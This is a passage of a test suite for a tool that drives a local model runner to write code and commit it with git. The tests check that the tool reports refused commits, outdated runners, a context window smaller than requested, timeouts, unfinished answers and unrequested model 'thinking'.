    expect(git('log', '-1', '--format=%s', 'elsewhere')).toBe('moves');
  });

  it('is said plainly when git itself refuses the commit', async () => {
    put('.git/hooks/pre-commit', '#!/bin/sh\necho "the hook says no" >&2\nexit 1\n');
    execFileSync('chmod', ['+x', join(dir, '.git/hooks/pre-commit')]);
    runner.replies = [{ content: GOOD }];
    const { code, out } = await run('--commit');
    expect(out).toContain('Not committed: git refused (the hook says no)');
    expect(code).toBe(1);
    expect(result().outcome).toBe('passed; not committed: git refused');
  });
});

describe('a runner that does not do as asked', () => {
  it('is not asked at all when it is too old to refuse a prompt longer than the window', async () => {
    for (const version of ['0.12.5', '0.9.0', 'dev']) {
      runner.version = version;
      const { code, out } = await run();
      expect(out, version).toContain(
        `the runner says it is version ${version}; the driver needs 0.12.6 or later`,
      );
      expect(code, version).toBe(4);
    }
    expect(runner.requests).toHaveLength(0);
    for (const version of ['0.12.6', '0.13.0', '1.0.0']) {
      runner.version = version;
      runner.replies = [{ content: 'STOP: only the version matters here.' }];
      expect((await run()).code, version).toBe(3);
    }
  });

  it('stops the run when it refuses the request, and says why', async () => {
    // A runner that refused has loaded no model: its reason is what the run reports, not the missing window.
    runner.listed = () => null;
    runner.replies = [
      { status: 400, error: 'the prompt is longer than the context length currently available to the model' },
    ];
    const { code, out } = await run('--no-first-run');
    expect(code).toBe(4);
    expect(out).toContain(
      'the runner refused the request (HTTP 400): the prompt is longer than the context length',
    );
    expect(git('status', '--short')).toBe('');
    expect(result().outcome).toBe('the runner did not answer as asked');
  });

  it('stops the run when it loaded a smaller window than was asked for, or does not say which', async () => {
    runner.window = 4096;
    runner.replies = [{ content: GOOD }];
    const small = await run('--no-first-run');
    expect(small.code).toBe(4);
    expect(small.out).toContain(
      'the runner loaded the model with a window of 4096 tokens, not the 16384 asked for',
    );
    expect(git('status', '--short')).toBe('');

    runner.window = null;
    runner.listed = () => null;
    runner.replies = [{ content: GOOD }];
    const unknown = await run('--no-first-run', '--keep-alive', '0');
    expect(unknown.code).toBe(4);
    expect(unknown.out).toContain('the runner did not say which window it loaded stub with');
    expect(runner.requests.at(-1).keep_alive).toBe(0);
    expect(git('status', '--short')).toBe('');

    // The runner's own spelling of a name is the same model.
    runner.listed = (model) => `registry.ollama.ai/library/${model.toLowerCase()}:latest`;
    runner.replies = [{ content: GOOD }];
    expect((await drive(CARD, '--model', 'Stub', '--url', url, '--no-first-run')).code).toBe(0);
  });

  it('stops the run when nothing answers, when the answer never comes, or when it ends unfinished', async () => {
    const none = await drive(CARD, '--model', 'stub', '--url', 'http://127.0.0.1:9', '--no-first-run');
    expect(none.code).toBe(4);
    expect(none.out).toContain('no answer from the model runner at http://127.0.0.1:9');

    runner.replies = [{ content: GOOD, unfinished: true }];
    const cut = await run('--no-first-run');
    expect(cut.out).toContain('the answer from the runner ended before it was finished');
    expect(cut.code).toBe(4);
    expect(git('status', '--short')).toBe('');

    runner.silent = true;
    const quiet = await run('--no-first-run', '--runner-timeout', '0.02');
    expect(quiet.out).toMatch(/the runner at http:\/\/127\.0\.0\.1:\d+ sent nothing for 0\.02 minutes/);
    expect(quiet.code).toBe(4);
  });

  it('leaves a record, and says what is left, when it fails after a first attempt was written', async () => {
    runner.replies = [{ content: NO_FIVE }, { status: 500, error: 'model runner has unexpectedly stopped' }];
    const { code, out } = await run();
    expect(code).toBe(4);
    expect(out).toContain(
      'Stopped: the runner refused the request (HTTP 500): model runner has unexpectedly stopped',
    );
    expect(out).toContain('What the run wrote is left in the working tree for the planner.');
    expect(git('status', '--short')).toBe('?? src/sum.ts');
    expect(result()).toMatchObject({
      outcome: 'the runner did not answer as asked',
      wrote: ['src/sum.ts', 'src/math.ts'],
      attempts: [
        { outcome: 'the commands failed (exit 1)' },
        { outcome: expect.stringContaining('the runner failed') },
      ],
    });
  });

  it('is told when the model thought although asked not to', async () => {
    runner.replies = [{ content: GOOD, thinking: 'Let me think about sums.' }];
    const { code, out } = await run();
    expect(code).toBe(0);
    expect(out).toContain('the model thought first although asked not to');
    expect(record().read('attempt-1-reply.md')).toContain(
      '<thinking>\nLet me think about sums.\n</thinking>',
    );
  });
});
